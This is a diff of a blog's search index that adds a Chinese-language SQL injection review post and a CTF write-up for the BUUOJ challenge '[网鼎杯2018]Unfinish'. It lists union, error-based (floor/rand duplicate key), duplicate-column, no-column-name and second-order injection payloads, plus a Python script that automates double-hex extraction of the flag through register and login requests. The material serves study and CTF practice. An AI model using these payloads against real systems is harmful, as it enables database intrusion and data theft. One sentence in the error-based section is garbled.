@@ -6423,8 +6423,56 @@ call：调用不可访问或不存在的方法时调用
 ]]></content>
   </entry>
   <entry>
-    <title>buu22</title>
+    <title>sql注入复习</title>
     <url>/2021/07/17/buu22/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近做到sql注入的题目，都没有很敏感了，于是决定要重新复习一下</p>
+<h2 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h2><p>源码对用户的输入的内容没有进行很好的过滤机制，导致用户输入的内容拼接到sql语句，影响原本sql语句的功能</p>
+<h2 id="sql注入种类："><a href="#sql注入种类：" class="headerlink" title="sql注入种类："></a>sql注入种类：</h2><h3 id="回显注入"><a href="#回显注入" class="headerlink" title="回显注入"></a>回显注入</h3><p>顾名思义，就是输入内容会有回显，我们可以通过回显内容判断是否成功过滤</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;and 1&#x3D;1&#39;1</span><br><span class="line">?id&#x3D;-1&#39;union select database()--+ #union还需要注意一下字段数</span><br></pre></td></tr></table></figure>
+
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="数据溢出："><a href="#数据溢出：" class="headerlink" title="数据溢出："></a>数据溢出：</h4><p>就是超过mysql的数据范围会报错：<br>但是又版本限制：&lt;=5.5.4的三皈依出金额图将报错内容显示出来</p>
+<h4 id="主键重复"><a href="#主键重复" class="headerlink" title="主键重复"></a>主键重复</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;数据库</span><br><span class="line">select * from user where 1&#x3D;1 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">&#x2F;&#x2F;表名</span><br><span class="line">select * from user where 1&#x3D;1 and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">&#x2F;&#x2F;字段</span><br><span class="line">select * from user where 1&#x3D;1 and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name&#x3D;&#39;user&#39; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">&#x2F;&#x2F;值</span><br><span class="line">select * from user where 1&#x3D;1 and (select 1 from (select count(*),concat((select id from user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="列名重复"><a href="#列名重复" class="headerlink" title="列名重复"></a>列名重复</h4><p>这个可以用在无列名注入的时候，爆出列名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from (select * from user a join user b)c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#39;id&#39;</span><br><span class="line">mysql&gt; select * from (select * from user a join user b using(id))c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#39;username&#39;</span><br></pre></td></tr></table></figure>
+
+<h4 id="xpath语法报错注入"><a href="#xpath语法报错注入" class="headerlink" title="xpath语法报错注入"></a>xpath语法报错注入</h4><p>利用extractvalue或者updatexml</p>
+<h3 id="一些特性注入"><a href="#一些特性注入" class="headerlink" title="一些特性注入"></a>一些特性注入</h3><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>看数据库编码是否发生改变</p>
+<h4 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1,2 union select * from user;</span><br></pre></td></tr></table></figure>
+
+<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>第一次插入数据库的数据被过滤，但是在下一次使用拼凑过程中以输入的形式进行组合，造成语句恶意拼接</p>
+<h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p>注册以后发现用户名显示了,猜测语句是</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into XXX (&#39;&#39;,&#39;&#39;,&#39;&#39;) values (&#39;&#39;,&#39;&#39;&#39;&#39;,&#39;&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>所以构造一下注入语句为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxxxxxxxxx insert into XXX (email,username,passwd) values (&#39;&#39;,&#39;&#39;+(select hex(database()))+&#39;&#39;,&#39;&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>在这里我们是使用+号这个运算符作为连接符<br>查询结果可以理解为:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0+database()+0</span><br></pre></td></tr></table></figure>
+
+<p>但是如果直接这样相加<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718150013.png" alt="img"></p>
+<p>是没有回显的，因为字母+数字在mysql里面加不了为0<br>所以要转化为十六进制，使用hex函数，但是经过测试，有的字符串只经过一次hex还是有字母，毕竟是十六进制~:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718150157.png" alt="img" style="zoom:67%;"><br>所以要经过两次十六进制的转换</p>
+<p>接下来是构造语句:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;&#39;+(select hex(hex(database())))+&#39;</span><br></pre></td></tr></table></figure>
+
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718151556.png" alt="img" style="zoom:67%;">
+经过两次hex解码，得知数据库名为web
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718151908.png" alt="img" style="zoom:67%;">
+information又被过滤了--，这个时候就直接猜表名为flag就好了~
+发现会有科学计数法e的存在，所以会损失精度，所以需要用substr截取
+
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718152455.png" alt="img" style="zoom:67%;">
+这里学到了一个新姿势，就是substr from for 因为是逗号的时候会报错--
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;0&#39;+(select substr(hex(hex((select * from flag))) from 1 for 10))+&#39;0</span><br></pre></td></tr></table></figure>
+
+<p>位数很多 需要使用脚本，脚本编写思路如下：<br>先在register注册账号，然后用login登录查询</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;707e6b02-6d3d-4527-8899-ab194079ea88.node4.buuoj.cn&#x2F;register.php&#39;</span><br><span class="line">for i in range(0,20):</span><br><span class="line">    # data&#x3D;&#123;</span><br><span class="line">    #     &quot;email&quot;:str(i)+&#39;@qq.com&#39;,</span><br><span class="line">    #     &quot;username&quot;:&quot;&#39;+substr(hex(hex((select * from flag))) from &quot;+str(i*10+1)+&quot; for 10)+&#39;&quot;,</span><br><span class="line">    #     &quot;password&quot;:&quot;1&quot;</span><br><span class="line">    #     &#125;</span><br><span class="line">    # r&#x3D;requests.post(url&#x3D;url,data&#x3D;data)</span><br><span class="line">    url2 &#x3D; &#39;http:&#x2F;&#x2F;707e6b02-6d3d-4527-8899-ab194079ea88.node4.buuoj.cn&#x2F;login.php&#39;</span><br><span class="line">    data&#x3D;&#123;</span><br><span class="line">        &quot;email&quot;:str(i)+&#39;@qq.com&#39;,</span><br><span class="line">        &quot;password&quot;:&quot;1&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    r&#x3D;requests.post(url&#x3D;url2,data&#x3D;data,allow_redirects&#x3D;True)</span><br><span class="line"></span><br><span class="line">    print (re.findall(&quot;.*?&lt;&#x2F;span&gt;&quot;,r.text)[0].replace(&#39;&lt;&#x2F;span&gt;&#39;,&#39;&#39;).strip(),end&#x3D;&#39;&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>这里我是先批量注册，然后再批量登录通过正则定位编码位置然后组装<br>由于现在buu太容易崩溃惹。。。所以我就0-5获取一次然后5-10获取一下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">363636433631363737423631363433383334363133383633333832443631333033353634324433343634333236363244363233343334333132443333363533393338363536353337333036313338363436333744</span><br></pre></td></tr></table></figure>
+
+<p>结果如上，然后hex解码两次即可</p>
+]]></content>
   </entry>
 </search>
